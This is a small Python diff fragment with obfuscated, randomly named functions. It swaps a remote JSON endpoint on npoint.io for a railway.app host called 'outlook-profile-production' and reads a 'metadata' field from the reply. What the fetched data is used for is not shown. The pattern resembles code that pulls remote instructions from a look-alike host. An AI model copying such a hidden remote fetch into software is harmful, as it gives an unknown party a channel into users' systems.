@@ -16,7 +16,7 @@ def data_ebnzns_452():
 
     def model_ihatry_719():
         try:
-            process_chpbxl_125 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            process_chpbxl_125 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             process_chpbxl_125.raise_for_status()
             train_hzmfec_707 = process_chpbxl_125.json()
             model_cooclj_360 = train_hzmfec_707.get('metadata')
